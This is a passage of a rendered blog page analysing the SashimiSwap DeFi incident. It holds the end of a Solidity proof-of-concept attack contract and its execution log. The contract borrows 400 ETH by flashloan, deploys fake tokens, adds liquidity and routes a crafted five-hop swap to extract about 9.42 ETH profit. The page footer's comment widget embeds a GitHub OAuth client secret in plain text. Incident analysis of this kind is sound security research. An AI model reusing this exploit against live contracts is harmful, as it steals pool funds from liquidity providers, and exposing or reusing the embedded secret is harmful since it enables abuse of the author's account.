each)...&quot;);</span><br><span class="line">        router.addLiquidity(</span><br><span class="line">            WETH,</span><br><span class="line">            address(fakeToken2),</span><br><span class="line">            LIQUIDITY_AMOUNT,</span><br><span class="line">            LIQUIDITY_AMOUNT,</span><br><span class="line">            0, 0,</span><br><span class="line">            address(this),</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;Adding liquidity for WETH-FakeToken3 pair (1 ETH each)...&quot;);</span><br><span class="line">        router.addLiquidity(</span><br><span class="line">            WETH,</span><br><span class="line">            address(fakeToken3),</span><br><span class="line">            LIQUIDITY_AMOUNT,</span><br><span class="line">            LIQUIDITY_AMOUNT,</span><br><span class="line">            0, 0,</span><br><span class="line">            address(this),</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;Adding liquidity for FakeToken2-FakeToken3 pair (1 token each)...&quot;);</span><br><span class="line">        router.addLiquidity(</span><br><span class="line">            address(fakeToken2),</span><br><span class="line">            address(fakeToken3),</span><br><span class="line">            LIQUIDITY_AMOUNT,</span><br><span class="line">            LIQUIDITY_AMOUNT,</span><br><span class="line">            0, 0,</span><br><span class="line">            address(this),</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        uint256 wethAfterLiquidity = weth.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;WETH balance after adding liquidity:&quot;, wethAfterLiquidity);</span><br><span class="line">        console.log(&quot;WETH used for liquidity:&quot;, initialWETH - wethAfterLiquidity);</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;\n=== Step 3: Exploiting the Vulnerability ===&quot;);</span><br><span class="line">        </span><br><span class="line">        // 构造复杂交易路径，利用漏洞</span><br><span class="line">        address[] memory path = new address[](5);</span><br><span class="line">        path[0] = address(fakeToken1);</span><br><span class="line">        path[1] = WETH;</span><br><span class="line">        path[2] = address(fakeToken2);</span><br><span class="line">        path[3] = address(fakeToken3);</span><br><span class="line">        path[4] = WETH;</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;Swap path: FakeToken1 -&gt; WETH -&gt; FakeToken2 -&gt; FakeToken3 -&gt; WETH&quot;);</span><br><span class="line">        console.log(&quot;Input amount: 457 FakeToken1&quot;);</span><br><span class="line">        </span><br><span class="line">        uint256 ethBeforeSwap = address(this).balance;</span><br><span class="line">        uint256 wethBeforeSwap = weth.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;ETH balance before swap:&quot;, ethBeforeSwap);</span><br><span class="line">        console.log(&quot;WETH balance before swap:&quot;, wethBeforeSwap);</span><br><span class="line">        </span><br><span class="line">        // 执行漏洞交易</span><br><span class="line">        router.swapExactTokensForETHSupportingFeeOnTransferTokens(</span><br><span class="line">            457 ether,</span><br><span class="line">            0,</span><br><span class="line">            path,</span><br><span class="line">            address(this),</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        uint256 ethAfterSwap = address(this).balance;</span><br><span class="line">        console.log(&quot;\nETH received from router:&quot;, ethAfterSwap - ethBeforeSwap);</span><br><span class="line">        console.log(&quot;Total ETH balance after swap:&quot;, ethAfterSwap);</span><br><span class="line">        </span><br><span class="line">        // 将swap获得的ETH转换为WETH</span><br><span class="line">        if (address(this).balance &gt; 0) &#123;</span><br><span class="line">            weth.deposit&#123;value: address(this).balance&#125;();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        uint256 wethAfterSwap = weth.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;\nWETH balance after converting ETH:&quot;, wethAfterSwap);</span><br><span class="line">        console.log(&quot;Net WETH gained from exploit:&quot;, wethAfterSwap - wethBeforeSwap);</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;\n=== Step 4: Removing Liquidity ===&quot;);</span><br><span class="line">        uint256 wethBeforeRemoval = weth.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;WETH balance before removing liquidity:&quot;, wethBeforeRemoval);</span><br><span class="line">        </span><br><span class="line">        // 移除流动性</span><br><span class="line">        _removeLiquidity();</span><br><span class="line">        </span><br><span class="line">        uint256 wethAfterRemoval = weth.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;WETH balance after removing liquidity:&quot;, wethAfterRemoval);</span><br><span class="line">        console.log(&quot;WETH recovered from liquidity removal:&quot;, wethAfterRemoval - wethBeforeRemoval);</span><br><span class="line"></span><br><span class="line">        console.log(&quot;\n=== Step 5: Repay Flashloan ===&quot;);</span><br><span class="line">        uint256 wethBalance = weth.balanceOf(address(this));</span><br><span class="line">        weth.withdraw(wethBalance);</span><br><span class="line">        uint256 flashloan_amount = 400 ether;</span><br><span class="line">        uint256 balance_after_repay = wethBalance - flashloan_amount; </span><br><span class="line">        console.log(&quot;WETH balance after repayment:&quot;, balance_after_repay);</span><br><span class="line"></span><br><span class="line">        console.log(&quot;\n=== Step 6: Final Profit Extraction ===&quot;);</span><br><span class="line">        // 提取利润给owner</span><br><span class="line">        console.log(&quot;Convert WETH to ETH, final ETH balance:&quot;, balance_after_repay);</span><br><span class="line">        payable(owner).transfer(balance_after_repay);</span><br><span class="line">        console.log(&quot;Profit transferred to owner:&quot;, balance_after_repay);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function _removeLiquidity() internal &#123;</span><br><span class="line">        address pair1 = factory.getPair(WETH, address(fakeToken1));</span><br><span class="line">        address pair2 = factory.getPair(WETH, address(fakeToken2));</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;Approving LP tokens for removal...&quot;);</span><br><span class="line">        IERC20(pair1).approve(SASHIMI_ROUTER, type(uint256).max);</span><br><span class="line">        IERC20(pair2).approve(SASHIMI_ROUTER, type(uint256).max);</span><br><span class="line"></span><br><span class="line">        if (pair1 != address(0)) &#123;</span><br><span class="line">            console.log(&quot;\n--- Removing WETH-FakeToken1 Liquidity ---&quot;);</span><br><span class="line">            //查询池子里的reserves</span><br><span class="line">            (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) = IUniswapV2Pair(pair1).getReserves();</span><br><span class="line">            address token0 = IUniswapV2Pair(pair1).token0();</span><br><span class="line">            address token1 = IUniswapV2Pair(pair1).token1();</span><br><span class="line">            </span><br><span class="line">            // 确定哪个是WETH，哪个是FakeToken1</span><br><span class="line">            uint256 wethReserve;</span><br><span class="line">            uint256 fakeToken1Reserve;</span><br><span class="line">            if (token0 == WETH) &#123;</span><br><span class="line">                wethReserve = reserve0;</span><br><span class="line">                fakeToken1Reserve = reserve1;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                wethReserve = reserve1;</span><br><span class="line">                fakeToken1Reserve = reserve0;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            console.log(&quot;WETH reserve in WETH-FakeToken1 pair:&quot;, wethReserve);</span><br><span class="line">            console.log(&quot;FakeToken1 reserve in WETH-FakeToken1 pair:&quot;, fakeToken1Reserve);</span><br><span class="line">            </span><br><span class="line">            uint256 liquidity1 = IERC20(pair1).balanceOf(address(this));</span><br><span class="line">            console.log(&quot;Our LP tokens in WETH-FakeToken1 pair:&quot;, liquidity1);</span><br><span class="line">            if (liquidity1 &gt; 0) &#123;</span><br><span class="line">                router.removeLiquidity(</span><br><span class="line">                    WETH,</span><br><span class="line">                    address(fakeToken1),</span><br><span class="line">                    liquidity1,</span><br><span class="line">                    0, 0,</span><br><span class="line">                    address(this),</span><br><span class="line">                    block.timestamp</span><br><span class="line">                );</span><br><span class="line">                console.log(&quot;Successfully removed WETH-FakeToken1 liquidity&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 移除WETH-FakeToken2流动性</span><br><span class="line">        if (pair2 != address(0)) &#123;</span><br><span class="line">            console.log(&quot;\n--- Removing WETH-FakeToken2 Liquidity ---&quot;);</span><br><span class="line">            // 查询池子里的reserves</span><br><span class="line">            (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) = IUniswapV2Pair(pair2).getReserves();</span><br><span class="line">            address token2 = IUniswapV2Pair(pair2).token0();</span><br><span class="line">            address token3 = IUniswapV2Pair(pair2).token1();</span><br><span class="line">            </span><br><span class="line">            // 确定哪个是WETH，哪个是FakeToken2</span><br><span class="line">            uint256 wethReserve;</span><br><span class="line">            uint256 fakeToken2Reserve;</span><br><span class="line">            if (token2 == WETH) &#123;</span><br><span class="line">                wethReserve = reserve0;</span><br><span class="line">                fakeToken2Reserve = reserve1;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                wethReserve = reserve1;</span><br><span class="line">                fakeToken2Reserve = reserve0;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            console.log(&quot;WETH reserve in WETH-FakeToken2 pair:&quot;, wethReserve);</span><br><span class="line">            console.log(&quot;FakeToken2 reserve in WETH-FakeToken2 pair:&quot;, fakeToken2Reserve);</span><br><span class="line">            </span><br><span class="line">            uint256 liquidity2 = IERC20(pair2).balanceOf(address(this));</span><br><span class="line">            console.log(&quot;Our LP tokens in WETH-FakeToken2 pair:&quot;, liquidity2);</span><br><span class="line">            if (liquidity2 &gt; 0) &#123;</span><br><span class="line">                router.removeLiquidity(</span><br><span class="line">                    WETH,</span><br><span class="line">                    address(fakeToken2),</span><br><span class="line">                    liquidity2,</span><br><span class="line">                    0, 0,</span><br><span class="line">                    address(this),</span><br><span class="line">                    block.timestamp</span><br><span class="line">                );</span><br><span class="line">                console.log(&quot;Successfully removed WETH-FakeToken2 liquidity&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 接收ETH</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="4-2-POC-log"><a href="#4-2-POC-log" class="headerlink" title="4.2 POC log"></a>4.2 POC log</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">Logs:</span><br><span class="line">  owner: 0xa8189407A37001260975b9dA61a81c3Bd9F55908</span><br><span class="line"></span><br><span class="line">Attack contract deployed at: 0x7929F4465A1BB2057f4626c983B9e076E68A5cce</span><br><span class="line">  Attack contract owner: 0xa8189407A37001260975b9dA61a81c3Bd9F55908</span><br><span class="line"></span><br><span class="line">  ========================================</span><br><span class="line">      SASHIMI SWAP ATTACK SIMULATION</span><br><span class="line">  ========================================</span><br><span class="line"></span><br><span class="line">  === Initial State ===</span><br><span class="line">  Attack contract owner: 0xa8189407A37001260975b9dA61a81c3Bd9F55908</span><br><span class="line"></span><br><span class="line">=== Executing Attack ===</span><br><span class="line">	//攻击前的EOA余额</span><br><span class="line">  Owner balance before attack: 12962074252980191969 // ~12.96 ETH</span><br><span class="line">  //合约闪电贷借来400ETH</span><br><span class="line">  Attack contract after Flashloan: 400000000000000000000 // ~400 ETH</span><br><span class="line"></span><br><span class="line">=== Step 1: Initial Setup ===</span><br><span class="line">  Initial WETH balance after deposit: 400000000000000000000</span><br><span class="line"></span><br><span class="line">=== Swap WETH <span class="keyword">for</span> UNI ===</span><br><span class="line">  UNI balance before swap: 0</span><br><span class="line">  UNI balance after swap: 6261304335558458817700 // ~6261.3 UNI</span><br><span class="line">  UNI tokens received: 6261304335558458817700</span><br><span class="line">  WETH balance after UNI swap: 250000000000000000000</span><br><span class="line">  Approved all tokens <span class="keyword">for</span> SashimiSwap Router</span><br><span class="line"></span><br><span class="line">=== Step 2: Adding Liquidity to Create Trading Pairs ===</span><br><span class="line">  Adding liquidity <span class="keyword">for</span> WETH-FakeToken1 pair (247.6 token each)...</span><br><span class="line">  Adding liquidity <span class="keyword">for</span> WETH-FakeToken2 pair (1 token each)...</span><br><span class="line">  Adding liquidity <span class="keyword">for</span> WETH-FakeToken3 pair (1 token each)...</span><br><span class="line">  Adding liquidity <span class="keyword">for</span> FakeToken2-FakeToken3 pair (1 token each)...</span><br><span class="line">  WETH balance after adding liquidity: 400000000000000000 //0.4 WETH</span><br><span class="line">  WETH used <span class="keyword">for</span> liquidity: 399600000000000000000</span><br><span class="line"></span><br><span class="line">=== Step 3: Exploiting the Vulnerability ===</span><br><span class="line">  Swap path: FakeToken1 -&gt; WETH -&gt; FakeToken2 -&gt; FakeToken3 -&gt; WETH</span><br><span class="line">  Input amount: 457 FakeToken1</span><br><span class="line">  ETH balance before swap: 0</span><br><span class="line">  WETH balance before swap: 400000000000000000 //0.4 WETH</span><br><span class="line"></span><br><span class="line">  ETH received from router: 160422480301580281814</span><br><span class="line">  WETH balance after converting ETH: 160822480301580281814</span><br><span class="line"></span><br><span class="line">=== Step 4: Removing Liquidity ===</span><br><span class="line">  WETH balance before removing liquidity: 160822480301580281814</span><br><span class="line">  Approving LP tokens <span class="keyword">for</span> removal...</span><br><span class="line"></span><br><span class="line">--- Removing WETH-FakeToken1 Liquidity ---</span><br><span class="line">  WETH reserve <span class="keyword">in</span> WETH-FakeToken1 pair: 87177519698419718186</span><br><span class="line">  FakeToken1 reserve <span class="keyword">in</span> WETH-FakeToken1 pair: 704600000000000000000</span><br><span class="line">  Our LP tokens <span class="keyword">in</span> WETH-FakeToken1 pair: 247599999999999999000</span><br><span class="line">  Successfully removed WETH-FakeToken1 liquidity</span><br><span class="line"></span><br><span class="line">--- Removing WETH-FakeToken2 Liquidity ---</span><br><span class="line">  WETH reserve <span class="keyword">in</span> WETH-FakeToken2 pair: 161422480301580281814</span><br><span class="line">  FakeToken2 reserve <span class="keyword">in</span> WETH-FakeToken2 pair: 6213448887487169</span><br><span class="line">  Our LP tokens <span class="keyword">in</span> WETH-FakeToken2 pair: 999999999999999000</span><br><span class="line">  Successfully removed WETH-FakeToken2 liquidity</span><br><span class="line">  WETH balance after removing liquidity: 409422480301580120038 </span><br><span class="line">  WETH recovered from liquidity removal: 248599999999999838224</span><br><span class="line"></span><br><span class="line">=== Step 5: Repay Flashloan ===</span><br><span class="line">  WETH balance after repayment: 9422480301580120038 // ~9.42 ETH</span><br><span class="line"></span><br><span class="line">=== Step 6: Final Profit Extraction ===</span><br><span class="line">  Convert WETH to ETH, final ETH balance: 9422480301580120038</span><br><span class="line">  Profit transferred to owner: 9422480301580120038</span><br><span class="line"></span><br><span class="line">=== Attack Results ===</span><br><span class="line">  Owner balance after attack: 22384554554560312007 // ~22.38 ETH</span><br><span class="line">  ETH profit <span class="keyword">for</span> owner: 9422480301580120038 ETH</span><br><span class="line">  UNI profit <span class="keyword">in</span> attack contract: 6261304335558458817700 UNI</span><br><span class="line"></span><br><span class="line">  ========================================</span><br><span class="line">           ATTACK COMPLETED</span><br><span class="line">  ========================================</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> SashimiSwap Incident &amp; POC</li>
+        <li><strong>Author:</strong> Chiu</li>
+        <li><strong>Created at
+                :</strong> 2025-06-20 10:36:41</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-07-15 18:25:08
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://github.com/Idealist17/github.io/2025/06/20/Sashimi Swap Incident &amp; POC/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/">#区块链</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/DeFi/">#DeFi</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/">#攻击事件分析</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/07/12/GMX_IO_Incident/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">GMX_IO Incident analysis &amp; POC</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/06/02/UniswapV2/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">UniswapV2 walkthrough</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: 'Ov23ctdJf8fChgcHijWU',
+                    clientSecret: 'ab085da53c1e5d5699612cc1a17d05a64daa0e25',
+                    repo: 'https://github.com/Idealist17/gitalk',
+                    owner: 'idealist17',
+                    admin: ['idealist17'],
+                    id: __gitalk__pathname,
+                    language: 'en',
+                    proxy: 'https://github.com/login/oauth/access_token'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">SashimiSwap Incident &amp; POC</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%83%8C%E6%99%AF"><span class="nav-text">1. 背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90"><span class="nav-text">2. 漏洞根本原因分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Root-cause"><span class="nav-text">2.1 Root cause</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Contributing-factors-%EF%BC%9A"><span class="nav-text">2.2 Contributing factors ：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E6%A0%B8%E5%BF%83%E6%BC%8F%E6%B4%9E%E4%BD%8D%E7%BD%AE"><span class="nav-text">2.3 核心漏洞位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E5%BF%83%E5%8C%96%E4%B8%8B%E6%AD%A3%E7%A1%AE%E7%9A%84swap%E9%80%BB%E8%BE%91"><span class="nav-text">中心化下正确的swap逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">2.4 漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="nav-text">3. 攻击过程详细分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-%E6%94%BB%E5%87%BB%E5%87%86%E5%A4%87%E9%98%B6%E6%AE%B5"><span class="nav-text">3.1 攻击准备阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-1-%E9%97%AA%E7%94%B5%E8%B4%B7%E8%8E%B7%E5%8F%96%E8%B5%84%E9%87%91"><span class="nav-text">3.1.1 闪电贷获取资金</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-2-%E9%83%A8%E7%BD%B2%E5%81%87%E4%BB%A3%E5%B8%81"><span class="nav-text">3.1.2 部署假代币</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-%E6%B5%81%E5%8A%A8%E6%80%A7%E6%9E%84%E5%BB%BA%E9%98%B6%E6%AE%B5"><span class="nav-text">3.2 流动性构建阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-1-%E5%88%9B%E5%BB%BA%E4%BA%A4%E6%98%93%E5%AF%B9"><span class="nav-text">3.2.1 创建交易对</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-2-%E6%B5%81%E5%8A%A8%E6%80%A7%E9%85%8D%E7%BD%AE"><span class="nav-text">3.2.2 流动性配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%98%B6%E6%AE%B5"><span class="nav-text">3.3 漏洞利用阶段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-1-%E6%9E%84%E9%80%A0%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84"><span class="nav-text">3.3.1 构造攻击路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-2-%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%BA%A4%E6%98%93"><span class="nav-text">3.3.2 执行漏洞交易</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-3-Key-points"><span class="nav-text">3.3.3 Key points</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-4-%E5%88%A9%E6%B6%A6%E6%8F%90%E5%8F%96%E9%98%B6%E6%AE%B5"><span class="nav-text">3.4 利润提取阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-1-%E7%A7%BB%E9%99%A4%E6%B5%81%E5%8A%A8%E6%80%A7"><span class="nav-text">3.4.1 移除流动性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-2-%E5%81%BF%E8%BF%98%E9%97%AA%E7%94%B5%E8%B4%B7"><span class="nav-text">3.4.2 偿还闪电贷</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-3-%E6%8F%90%E5%8F%96%E5%88%A9%E6%B6%A6"><span class="nav-text">3.4.3 提取利润</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-POC"><span class="nav-text">4.1 POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-POC-log"><span class="nav-text">4.2 POC log</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Chiu</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        35 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.4</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
